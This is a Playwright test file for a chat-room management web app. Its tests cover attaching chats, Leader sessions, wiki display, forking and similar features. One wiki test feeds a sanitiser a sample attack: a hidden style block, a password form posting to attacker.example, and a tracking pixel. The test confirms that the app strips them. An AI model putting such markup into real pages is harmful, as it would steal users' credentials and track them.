import { test, expect } from '@playwright/test'

const BASE = process.env.FEATHER_URL || 'http://localhost:4870'

test('attaches and detaches an existing chat without duplicate Room rows', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  let attached = false
  const seeded = {
    id: 'seeded-room-chat', title: 'Seeded marriage chat', updatedAt: '2026-08-22T12:00:00Z',
    isActive: false, agent: 'claude', roomAssigned: true,
  }
  const candidate = {
    id: 'ungrouped-chat', title: 'Chat to attach', updatedAt: '2026-08-22T11:00:00Z',
    isActive: false, agent: 'codex', projectId: '-srv-zak-unrelated',
  }

  await page.route('**/api/rooms', async (route) => {
    await route.fulfill({ json: { rooms: [{
      name: 'marriage', cwd: '/srv/zak/home/rooms/marriage', active: false,
      latest: null, updatedAt: seeded.updatedAt,
      pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: '2026-08-22T12:15:00Z', sessionId: null },
      sessions: attached ? [seeded, { ...candidate, roomAssigned: true }] : [seeded],
    }] } })
  })
  await page.route('**/api/sessions?limit=300', async (route) => {
    await route.fulfill({ json: { sessions: [candidate] } })
  })
  await page.route('**/api/search?q=*', async (route) => {
    await route.fulfill({ json: { results: [candidate] } })
  })
  await page.route('**/api/rooms/marriage/assign', async (route) => {
    const body = JSON.parse(route.request().postData() || '{}')
    if (body.sessionId === candidate.id) attached = !body.remove
    await route.fulfill({ json: { ok: true, assignments: attached ? { [candidate.id]: 'marriage' } : {} } })
  })
  await page.route('**/api/rooms/marriage/pulse', async (route) => {
    await route.fulfill({ json: { ok: true, pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null } } })
  })

  await page.goto(BASE)
  await expect(page.getByText('#marriage')).toBeVisible()
  await page.getByTestId('history-marriage').click()
  await page.getByText('Room options', { exact: true }).click()
  await expect(page.getByTestId('pulse-marriage')).toHaveText('Stop background')
  await page.getByTestId('pulse-marriage').click()
  await expect(page.getByTestId('pulse-marriage')).toHaveText('Start background')
  await page.getByText('Room options', { exact: true }).click()
  await page.getByTestId('attach-existing-marriage').click()
  await expect(page.getByTestId('attach-picker-marriage')).toBeVisible()
  await page.getByTestId(`attach-${candidate.id}`).click()

  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
  await expect(page.getByTestId(`detach-${candidate.id}`)).toBeVisible()
  await page.screenshot({ path: 'test-results/rooms-u3-attach-mobile.png', fullPage: true })
  await page.getByTestId(`detach-${candidate.id}`).click()
  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(0)

  await page.getByTestId('attach-search-marriage').fill('Chat to attach')
  await page.getByTestId('attach-search-marriage').press('Enter')
  await expect(page.getByTestId(`attach-${candidate.id}`)).toBeVisible()
  await page.getByTestId(`attach-${candidate.id}`).click()
  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
})

test('Room card opens its Leader while History reveals only past chats', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const leader = {
    id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z',
    isActive: false, agent: 'omp', roomAssigned: true,
  }
  const caretaker = {
    id: 'caretaker-chat', title: '#feather Caretaker', updatedAt: '2026-08-23T22:00:00Z',
    isActive: true, agent: 'omp', roomAssigned: true,
  }
  const other = {
    id: 'other-chat', title: 'One-off investigation', updatedAt: '2026-08-23T21:00:00Z',
    isActive: false, agent: 'claude', roomAssigned: true,
  }
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'feather', cwd: '/home/user/rooms/feather', active: true,
    latest: { role: 'assistant', text: 'Leader finished work.' }, updatedAt: leader.updatedAt,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: null, sessionId: null },
    leaderSessionId: leader.id,
    residents: [
      { role: 'leader', sessionId: leader.id, agent: 'omp', title: leader.title, status: 'waiting' },
      { role: 'caretaker', sessionId: caretaker.id, agent: 'omp', title: caretaker.title, status: 'working' },
    ],
    sidecarGroupId: 'room-feather',
    sessions: [leader, caretaker, other],
  }] } }))

  await page.goto(BASE)
  await expect(page.getByTestId('room-card-feather')).toContainText('2 residents')
  await page.getByText('#feather', { exact: true }).click()
  await expect(page).toHaveURL(/#leader-human-chat$/)

  await page.goto(BASE)
  await page.getByTestId('history-feather').click()
  await expect(page).toHaveURL(/#?$/)
  await expect(page.getByText('Past chats', { exact: true })).toBeVisible()
  await expect(page.getByText('One-off investigation', { exact: true })).toBeVisible()
  await expect(page.getByText('Room options', { exact: true })).toBeVisible()
  await expect(page.getByTestId('resident-feather-leader')).toHaveCount(0)
  await expect(page.getByTestId('resident-feather-caretaker')).toHaveCount(0)
  await expect(page.getByText('#feather Leader', { exact: true })).toHaveCount(0)
  await expect(page.getByText('#feather Caretaker', { exact: true })).toHaveCount(0)

  await page.getByText('One-off investigation', { exact: true }).click()
  await expect(page).toHaveURL(/#other-chat$/)
})

test('Room without a Leader expands before its OMP Leader is created', async ({ page }) => {
  let sessionBody = null
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'new-room', cwd: '/srv/rooms/new-room', active: false, latest: null, updatedAt: null,
    leaderSessionId: null, residents: [], sidecarGroupId: null, sessions: [],
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
  }] } }))
  await page.route('**/api/sessions', async route => {
    if (route.request().method() !== 'POST') return route.continue()
    sessionBody = JSON.parse(route.request().postData() || '{}')
    await route.fulfill({ json: { id: sessionBody.id, status: 'starting', agent: 'omp', roomRole: 'leader' } })
  })

  await page.goto(BASE)
  await page.getByText('#new-room', { exact: true }).click()
  await expect(page).toHaveURL(/#?$/)
  await expect(page.getByRole('button', { name: '+ Start OMP Leader' })).toBeVisible()
  expect(sessionBody).toBeNull()

  await page.getByRole('button', { name: '+ Start OMP Leader' }).click()
  await expect.poll(() => sessionBody).toMatchObject({
    agent: 'omp',
    roomName: 'new-room',
    roomRole: 'leader',
  })
})

test('failed Room assignment exposes the created ungrouped chat without opening it as a member', async ({ page }) => {
  const createdId = 'created-but-ungrouped-chat'
  const leader = {
    id: 'failure-room-leader', title: '#failure-room Leader', updatedAt: '2026-08-30T12:00:00Z',
    isActive: true, agent: 'omp', roomAssigned: true,
  }
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'failure-room', cwd: '/srv/rooms/failure-room', active: true, latest: null, updatedAt: leader.updatedAt,
    leaderSessionId: leader.id,
    residents: [{ role: 'leader', sessionId: leader.id, agent: 'omp', title: leader.title, status: 'working' }],
    sidecarGroupId: 'room-failure-room', sessions: [leader],
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
  }] } }))
  await page.route('**/api/sessions', async route => {
    if (route.request().method() !== 'POST') return route.continue()
    await route.fulfill({ json: { id: createdId, status: 'starting', agent: 'omp' } })
  })
  await page.route('**/api/rooms/failure-room/assign', route => route.fulfill({
    status: 503,
    json: { error: 'Room assignment unavailable' },
  }))

  await page.goto(BASE)
  await page.getByTestId('history-failure-room').click()
  await page.getByText('Room options', { exact: true }).click()
  const answers = ['Recovery chat', 'omp']
  page.on('dialog', dialog => dialog.accept(answers.shift() || ''))
  await page.getByRole('button', { name: '+ Named chat' }).click()

  const recovery = page.getByTestId('room-assignment-recovery')
  await expect(recovery).toContainText(createdId)
  await expect(recovery).toContainText('It remains ungrouped')
  await expect(recovery).toContainText('Room assignment unavailable')
  await expect(page).toHaveURL(/#?$/)
  await expect(page.getByTestId('room-card-failure-room')).not.toContainText(createdId)

  await recovery.getByRole('button', { name: `Open ungrouped chat ${createdId}` }).click()
  await expect(page).toHaveURL(new RegExp(`#${createdId}$`))
})

test('Wiki presents caretaker synthesis and never exposes raw Updates or active content', async ({ page }) => {
  let updateRequests = 0
  let remoteMediaRequests = 0
  await page.route('https://attacker.example/**', async route => {
    remoteMediaRequests++
    await route.abort()
  })
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'briefings', cwd: '/srv/rooms/briefings', active: false,
    latest: null, updatedAt: '2026-08-22T12:00:00Z', sessions: [],
    leaderSessionId: null, residents: [], sidecarGroupId: null,
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
    updates: { count: 2, latestAt: '2026-08-22T12:00:00Z', latest: 'RAW COPIED TWEET' },
  }] } }))
  await page.route('**/api/rooms/briefings/wiki', route => route.fulfill({ json: {
    pages: [{ name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }],
  } }))
  await page.route('**/api/rooms/briefings/wiki/page**', route => route.fulfill({ json: {
    name: 'Home',
    content: '# Briefing knowledge\n\nThe caretaker synthesized durable evidence.\n\n<style>body{display:none}</style><form action="https://attacker.example/steal"><input name="password"></form>![pixel](https://attacker.example/pixel)',
    updatedAt: '2026-08-22T14:00:00Z',
  } }))
  await page.route('**/api/rooms/briefings/updates', route => {
    updateRequests++
    return route.fulfill({ json: { updates: [{ id: 'raw', ts: null, text: 'RAW COPIED TWEET' }] } })
  })

  await page.goto(BASE)
  await page.getByTestId('history-briefings').click()
  await page.getByText('Room options', { exact: true }).click()
  await page.getByTestId('wiki-briefings').click()
  const panel = page.getByTestId('wiki-panel-briefings')
  await expect(panel).toContainText('The caretaker synthesized durable evidence')
  await expect(panel).not.toContainText('RAW COPIED TWEET')
  await expect(panel.locator('style, form, input, img')).toHaveCount(0)
  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
  expect(updateRequests).toBe(0)
  expect(remoteMediaRequests).toBe(0)
})

test('passes the chosen model only when launching a new OMP session', async ({ page }) => {
  let sessionBody = null
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [] } }))
  await page.route('**/api/sessions', async route => {
    if (route.request().method() !== 'POST') return route.continue()
    sessionBody = JSON.parse(route.request().postData() || '{}')
    await route.fulfill({ json: { id: sessionBody.id, status: 'starting', agent: sessionBody.agent } })
  })

  await page.goto(BASE)
  await page.getByText('New chat outside a Room', { exact: true }).click()
  await page.getByTestId('omp-model-override').fill('anthropic/claude-opus-5')
  await page.getByRole('button', { name: '+ OMP', exact: true }).click()
  await expect.poll(() => sessionBody).toMatchObject({
    agent: 'omp',
    model: 'anthropic/claude-opus-5',
  })
})

test('shows friction only on the Room that reported it', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const complaints = [{
    id: 'f1', timestamp: '2026-08-23T12:00:00Z', source: 'health',
    summary: 'Calendar login loop', evidence: 'OAuth callback returned 401',
  }]
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'health', cwd: '/srv/rooms/health', active: false, latest: null,
    updatedAt: complaints[0].timestamp,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 1, latestAt: complaints[0].timestamp, latest: complaints[0].summary },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
    sessions: [],
  }, {
    name: 'family', cwd: '/srv/rooms/family', active: false, latest: null, updatedAt: null,
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
    sessions: [],
  }] } }))
  await page.route('**/api/rooms/health/friction', route => route.fulfill({ json: { complaints, count: 1 } }))

  await page.goto(BASE)
  await page.getByTestId('history-health').click()
  await page.getByText('Room options', { exact: true }).click()
  await expect(page.getByTestId('friction-health')).toContainText('1')
  await page.getByTestId('history-health').click()
  await page.getByTestId('history-family').click()
  await page.getByText('Room options', { exact: true }).click()
  await expect(page.getByTestId('friction-family')).toContainText('0')
  await page.getByTestId('history-family').click()
  await page.getByTestId('history-health').click()
  await page.getByText('Room options', { exact: true }).click()
  await page.getByTestId('friction-health').click()
  const panel = page.getByTestId('friction-panel-health')
  await expect(panel).toBeVisible()
  await expect(panel).toContainText('Calendar login loop')
  await expect(panel).toContainText('OAuth callback returned 401')
  await expect(page.getByTestId('friction-panel-family')).toHaveCount(0)
})

test('forks a local chat into an isolated named workspace', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const sourceId = '11111111-2222-4333-8444-555555555555'
  const forkedId = '66666666-7777-4888-8999-aaaaaaaaaaaa'
  let forkBody = null
  let forked = false
  const listedSessions = () => [
    { id: sourceId, title: 'Inventory review', updatedAt: '2026-08-31T20:00:00Z', isActive: true, agent: 'omp' },
    ...(forked ? [{ id: forkedId, title: 'Inventory review branch', updatedAt: '2026-08-31T20:01:00Z', isActive: true, agent: 'omp' }] : []),
  ]
  await page.route('**/api/sessions?*', route => route.fulfill({ json: { sessions: listedSessions() } }))
  await page.route('**/api/sessions/*/messages?*', route => route.fulfill({
    json: { messages: [], hasMore: false, cursor: 0, nextBefore: 0 },
  }))
  await page.route('**/api/sessions/*/protocol-runs', route => route.fulfill({ json: { runs: [] } }))
  await page.route('**/api/sessions/*/stream', route => route.fulfill({
    status: 200,
    contentType: 'text/event-stream',
    body: 'event: connected\ndata: {}\n\n',
  }))
  await page.route(`**/api/sessions/${sourceId}/room`, route => route.fulfill({
    json: {
      room: null, kind: 'chat', role: null, label: 'Inventory review',
      forkOf: null, forkSourceTitle: null, workspaceMode: null, forkBranch: null,
    },
  }))
  await page.route(`**/api/sessions/${forkedId}/room`, route => route.fulfill({
    json: {
      room: null, kind: 'chat', role: null, label: 'Inventory review branch',
      forkOf: sourceId, forkSourceTitle: 'Inventory review', workspaceMode: 'isolated', forkBranch: 'feather/fork-66666666',
    },
  }))
  await page.route(`**/api/sessions/${sourceId}/fork`, async route => {
    forkBody = JSON.parse(route.request().postData() || '{}')
    forked = true
    await route.fulfill({ json: {
      id: forkedId,
      status: 'starting',
      room: null,
      workspaceMode: forkBody.workspaceMode,
      workspacePath: '/tmp/fork-worktree',
      notice: null,
    } })
  })

  await page.goto(`${BASE}/#${sourceId}`)
  await expect(page.getByTestId('session-header')).toContainText('Inventory review')
  await page.getByTestId('session-header').locator('button').filter({ hasText: '⋮' }).click()
  await page.getByTestId('fork-chat').click()
  await expect(page.getByTestId('fork-dialog')).toBeVisible()
  await expect(page.getByTestId('fork-workspace-isolated')).toHaveAttribute('aria-pressed', 'true')
  await page.getByTestId('fork-title').fill('Inventory review branch')
  await page.getByTestId('fork-submit').click()

  await expect(page).toHaveURL(new RegExp(`#${forkedId}$`))
  expect(forkBody).toEqual({ title: 'Inventory review branch', workspaceMode: 'isolated' })
  await expect(page.getByTestId('fork-lineage')).toContainText('Forked from Inventory review')
})
